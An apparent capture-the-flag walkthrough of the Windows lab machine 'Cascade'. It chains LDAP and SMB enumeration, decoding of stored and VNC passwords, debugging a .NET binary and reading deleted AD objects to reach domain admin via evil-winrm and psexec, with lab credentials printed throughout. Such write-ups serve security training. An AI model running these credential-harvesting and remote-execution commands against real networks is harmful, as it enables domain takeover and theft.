---
layout: default
---

# Cascade

# Enumeration

- IP → 10.10.10.182

Port scan reported the following ports opened.

```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49170/tcp open  unknown          syn-ack
```

```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-11-09 14:57:32Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-09T14:58:22
|_  start_date: 2023-11-09T12:30:41
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51409/tcp): CLEAN (Timeout)
|   Check 2 (port 35700/tcp): CLEAN (Timeout)
|   Check 3 (port 10882/udp): CLEAN (Timeout)
|   Check 4 (port 26875/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Port 445/139

- SMB
- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ crackmapexec smb 10.10.10.182 -u "%" -p "%" --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\%:% STATUS_LOGON_FAILURE
```

## Port 135

- RPC
- We have access

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade/enumeration]
└─$ rpcclient -U '%' 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

## Port 88

```bash
2023/12/19 06:16:52 >  [+] VALID USERNAME:       s.hickson@cascade.local
2023/12/19 06:16:53 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2023/12/19 06:16:52 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2023/12/19 06:16:53 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2023/12/19 06:16:53 >  [+] VALID USERNAME:       r.thompson@cascade.local
2023/12/19 06:16:56 >  [+] VALID USERNAME:       util@cascade.local
2023/12/19 06:16:56 >  [+] VALID USERNAME:       s.smith@cascade.local
2023/12/19 06:16:56 >  [+] VALID USERNAME:       arksvc@cascade.local
2023/12/19 06:16:58 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2023/12/19 06:16:58 >  [+] VALID USERNAME:       j.allen@cascade.local
2023/12/19 06:16:58 >  [+] VALID USERNAME:       d.burman@cascade.local
```

## Port 386

Enumerating this service we will find some uncommon fields. First we dump the entire ldap tree into a file.

```bash
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" > full_tree.txt
```

To filter by this uncommon fields we can use the following command.

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ cat ldap/full_tree.txt| grep -vE "^dn|^dc|^objectClass|^objectClass|^objectClass|^objectClass|^cn|^sn|^ou|^givenName|^distinguishedName|^instanceType|^whenCreated|^whenChanged|^displayName|^uSNCreated|^memberOf|^uSNChanged|^name|^objectGUID|^userAccountControl|^badPwdCount|^codePage|^countryCode|^badPasswordTime|^lastLogoff|^lastLogon|^pwdLastSet|^primaryGroupID|^objectSid|^accountExpires|^logonCount|^sAMAccountName|^sAMAccountType|^userPrincipalName|^objectCategory|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^lastLogonTimestamp|^msDS-SupportedEncryptionTypes|^serverReference|^showInAdvancedViewOnly|^msDFSR-DirectoryFilter|^systemFlags|^#|^msDFSR-RootPath|^msDFSR-StagingPath|^msDFSR-Enabled|^msDFSR-Options|^msDFSR-ContentSetGuid|^msDFSR-ReplicationGroupGuid|^msDFSR-ReadOnly|^lastSetTime|^priorSetTime|^isCriticalSystemObject|^fSMORoleOwner|^rIDAvailablePool|^isCriticalSystemObject|^rIDAllocationPool|^rIDPreviousAllocationPool|^rIDUsedPool|^rIDNextRID|^member|^groupType|^scriptPath|^MemberReferenceBL|^ComputerReference|^FileFilter|^ReplicationGroupType|^ref|^msDFSR-MemberReference|^msDFSR-FileFilter|^servicePrincipalName|^dNSHostName:|^rIDSetReferences|^revision|^samDomainUpdates|^localPolicyFlags|^operatingSystem|^operatingSystemVersion|^operatingSystemServicePack|^creationTime|^forceLogoff|^lockoutDuration|^lockOutObservationWindow|^lockoutThreshold|^maxPwdAge|^minPwdAge|^minPwdLength|^modifiedCountAtLastProm|^nextRid|^pwdProperties|^pwdHistoryLength|^serverState|^uASCompat|^modifiedCount|^ipsecName|^ipsecID|^ipsecDataType|^ipsecData|^iPSECNegotiationPolicyType|^iPSECNegotiationPolicyAction|^ipsecID|^ipsecDataType|^ipsecData|^ipsecOwnersReference|^auditingPolicy|^description|^gPLink|^ipsecFilterReference|^ipsecISAKMPReference|^ipsecNFAReference|^ipsecNegotiationPolicyReference|^masteredBy|^ms-DS-MachineAccountQuota|^msDFSR-ComputerReference|^msDFSR-ComputerReferenceBL|^msDFSR-Flags|^msDFSR-ReplicationGroupType|^msDFSR-Version|^msDS-AllUsersTrustQuota|^msDS-Behavior-Version|^msDS-IsDomainFor|^msDS-NcType|^msDS-PerUserTrustQuota|^msDS-PerUserTrustTombstonesQuota|^msDS-TombstoneQuotaFactor|^msDs-masteredBy|^nTMixedDomain|^otherWellKnownObjects|^rIDManagerReference|^result|^search|^subRefs|^wellKnownObjects" | sed '/^$/d' | grep -E "^.*?:"
cascadeLegacyPwd: clk0bjVldmE=
```

And we obtain a password. To know where this password is we can use `grep` command.

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ cat ldap/full_tree.txt| grep -A10 -B11 cascadeLegacyPwd:
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

We can see that the password is within user r.thompson section of the tree. We will decode the password and check if is correct for the user.

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

We have credentials → `r.thompson:rY4n5eva`.

# Enumeration with credentials - r.thompson

The service we could access before was SMB, so let’s check it now.

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ smbmap -H 10.10.10.182 -u "r.thompson" -p "rY4n5eva" -d "cascade.local"

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.182:445        Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

The first share we will enumearte is **Data**.

### Data share

Inside this share we can only access one resource, which is **IT**. We mount the share in a route of our system to navegate through it easily.

```bash
┌──(root㉿kali)-[/home/kali/machines/windows/cascade]
└─# mount -t cifs //10.10.10.182/Data /mnt/data_share -o username=r.thompson,password=rY4n5eva,domain=cascade.local
```

Now we will check the entire volume.

```bash
┌──(root㉿kali)-[/mnt/data_share]
└─# tree -af
.
├── ./Contractors
├── ./Finance
├── ./IT
│   ├── ./IT/Email Archives
│   │   └── ./IT/Email Archives/Meeting_Notes_June_2018.html
│   ├── ./IT/LogonAudit
│   ├── ./IT/Logs
│   │   ├── ./IT/Logs/Ark AD Recycle Bin
│   │   │   └── ./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
│   │   └── ./IT/Logs/DCs
│   │       └── ./IT/Logs/DCs/dcdiag.log
│   └── ./IT/Temp
│       ├── ./IT/Temp/r.thompson
│       └── ./IT/Temp/s.smith
│           └── ./IT/Temp/s.smith/VNC Install.reg
├── ./Production
└── ./Temps
```

- Meeting_Notes_June_2018.html
    
    Checking this HTML file with a web browser we will see some interesting things.
    
    Date:
    
    ```bash
    From:                                         Steve Smith
    To:                                           IT (Internal)
    Sent:                                         14 June 2018 14:07
    Subject:                                      Meeting Notes
    ```
    
    ```bash
    -- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password)
    ```
    
    We have a new user `TempAdmin`, which has the same password as the current admin account. Using kerbrute to see if the user exists, we can actually see that this user no longer exists in the domain.
    
- ArkAdRecycleBin.log
    
    ```bash
    ┌──(root㉿kali)-[/mnt/data_share]
    └─# cat './IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log'
    1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
    1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
    1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
    1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
    2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
    2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
    2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
    2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
    2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
    2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
    8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
    8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
    8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
    8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
    8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
    8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
    ```
    
    There is a software running as user `ArkSvc`. We can see that this is the user that deleted `TempAdmin` user.
    
- dcdiag.log
    
    We don’t see anything interesting here.
    
- VNC Install.reg
    
    ```bash
    [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
    
    [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
    "ExtraPorts"=""
    "QueryTimeout"=dword:0000001e
    "QueryAcceptOnTimeout"=dword:00000000
    "LocalInputPriorityTimeout"=dword:00000003
    "LocalInputPriority"=dword:00000000
    "BlockRemoteInput"=dword:00000000
    "BlockLocalInput"=dword:00000000
    "IpAccessControl"=""
    "RfbPort"=dword:0000170c
    "HttpPort"=dword:000016a8
    "DisconnectAction"=dword:00000000
    "AcceptRfbConnections"=dword:00000001
    "UseVncAuthentication"=dword:00000001
    "UseControlAuthentication"=dword:00000000
    "RepeatControlAuthentication"=dword:00000000
    "LoopbackOnly"=dword:00000000
    "AcceptHttpConnections"=dword:00000001
    "LogLevel"=dword:00000000
    "EnableFileTransfers"=dword:00000001
    "RemoveWallpaper"=dword:00000001
    "UseD3D"=dword:00000001
    "UseMirrorDriver"=dword:00000001
    "EnableUrlParams"=dword:00000001
    "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
    "AlwaysShared"=dword:00000000
    "NeverShared"=dword:00000000
    "DisconnectClients"=dword:00000001
    "PollingInterval"=dword:000003e8
    "AllowLoopback"=dword:00000000
    "VideoRecognitionInterval"=dword:00000bb8
    "GrabTransparentWindows"=dword:00000001
    "SaveLogToAllUsersPath"=dword:00000000
    "RunControlInterface"=dword:00000001
    "IdleTimeout"=dword:00000000
    "VideoClasses"=""
    "VideoRects"=""
    ```
    
    With have a password, however, if we try to decoded it directly we will notice that it is actually encrypted. A quick search on the internet will lead us to know how to retrieve the plain text password.
    
    We endup with a new credential possibly for user s.smith.
    
    ```bash
    ┌──(kali㉿kali)-[~/machines/windows/cascade]
    └─$ crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2'
    SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
    SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
    ```
    
    Credentials → `s.smith:sT333ve2`
    

### Print share

Empty

```bash
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ smbclient \\\\10.10.10.182\\print$ -U "cascade.local/r.thompson"
Password for [CASCADE.LOCAL\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 14 07:37:10 2009
  ..                                  D        0  Tue Jul 14 07:37:10 2009
  color                               D        0  Tue Jul 14 07:37:10 2009
  IA64                                D        0  Tue Jul 14 06:58:30 2009
  W32X86                              D        0  Tue Jul 14 06:58:30 2009
  x64                                 D        0  Mon Jan 13 04:09:11 2020

                6553343 blocks of size 4096. 1625412 blocks available
smb: \> dir color
  color                               D        0  Tue Jul 14 07:37:10 2009

                6553343 blocks of size 4096. 1625412 blocks available
smb: \> dir IA64
  IA64                                D        0  Tue Jul 14 06:58:30 2009

                6553343 blocks of size 4096. 1625412 blocks available
smb: \> dir W32X86
  W32X86                              D        0  Tue Jul 14 06:58:30 2009

                6553343 blocks of size 4096. 1625396 blocks available
smb: \> dir x64
  x64                                 D        0  Mon Jan 13 04:09:11 2020
```

# Enumeration with credentials - s.smith

We have access to a new share called **Audit$**. We will again mount it an check it from our file system.

```bash
┌──(root㉿kali)-[/mnt/audit]
└─# tree -af 
.
├── ./CascAudit.exe
├── ./CascCrypto.dll
├── ./DB
│   └── ./DB/Audit.db
├── ./RunAudit.bat
├── ./System.Data.SQLite.EF6.dll
├── ./System.Data.SQLite.dll
├── ./x64
│   └── ./x64/SQLite.Interop.dll
└── ./x86
    └── ./x86/SQLite.Interop.dll
```

- Audit.db
    
    We will open this file with sqlite3. 
    
    ```sql
    sqlite> .schema
    CREATE TABLE IF NOT EXISTS "Ldap" (
            "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
            "uname" TEXT,
            "pwd"   TEXT,
            "domain"        TEXT
    );
    CREATE TABLE sqlite_sequence(name,seq);
    CREATE TABLE IF NOT EXISTS "Misc" (
            "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
            "Ext1"  TEXT,
            "Ext2"  TEXT
    );
    CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
            "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
            "Username"      TEXT,
            "Name"  TEXT,
            "DistinguishedName"     TEXT
    );
    ```
    
    ```sql
    sqlite> select * from Ldap;
    1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
    
    sqlite> select * from Misc;
    
    sqlite> select * from DeletedUserAudit;
    6|test|Test
    DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
    7|deleted|deleted guy
    DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
    9|TempAdmin|TempAdmin
    DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
    sqlite>
    ```
    
    We have the password of the user ArkSvc, however it is encrypted. Before we continue, we will enumerate ldap a bit more.
    
    ![Untitled](Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled.png)
    
    User Arksvc is part of AD Recycle Bin, what means that he can see the data for delete objects, such as `TempAdmin`.  TempAdmin had the same password as the current administrator account. Maybe we can obtain the password from this deleted user.
    

# Obtaining Arksvc password.

This entire binary probably uses Arksvc account to delete user. I infier this because in the database we have all the deleted objects. So let’s analyse it. We will use DnsSpy for this.

![Untitled](Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%201.png)

Here we can see the portion of the code that decrypts the password. We could create a script in python that uses the key and the IV (that can be foundin the **CascCrypto.dll** file) to decrypt the password. We could also run the program and set a breakpoint to see the value of the variable **password**.

![Untitled](Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%202.png)

Now we run the script in debug mode and when it arrives this part  we should see the password decrypted.

![Untitled](Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%203.png)

![Untitled](Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%204.png)

Credentials → `Arksvc:w3lc0meFr31nd` .

# Domain admin privilege escalation

The final step is to become domain admin of the domain. First we connect using `evil-winrm`.

```sql
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ evil-winrm  -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

From here we will check the deleted AD objects, since this user has that privilege because is part of **AD Recycle Bin** group.

```sql
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

In the output we will see an interesting field.

```sql
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
```

If we decode this password we will obtain the password of the user Administrator.

```sql
┌──(root㉿kali)-[/mnt/audit]
└─# echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
```

Credentials → `Administrator:baCT3r1aN00dles`

```sql
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ crackmapexec smb 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

```sql
┌──(kali㉿kali)-[~/machines/windows/cascade]
└─$ impacket-psexec 'cascade.local/Administrator:baCT3r1aN00dles@10.10.10.182'     
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file DcoHEJsJ.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service NewD on 10.10.10.182.....
[*] Starting service NewD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```